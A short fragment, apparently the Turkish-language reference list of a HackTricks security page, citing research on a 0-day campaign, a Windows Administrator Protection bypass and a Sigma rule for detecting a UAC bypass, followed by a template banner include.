- [6] [Check Point Research – Operation TrueChaos: Güneydoğu Asya hükümet hedeflerine karşı 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection'ı bypass etme](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task kullanarak UAC bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
{{#include ../../banners/hacktricks-training.md}}
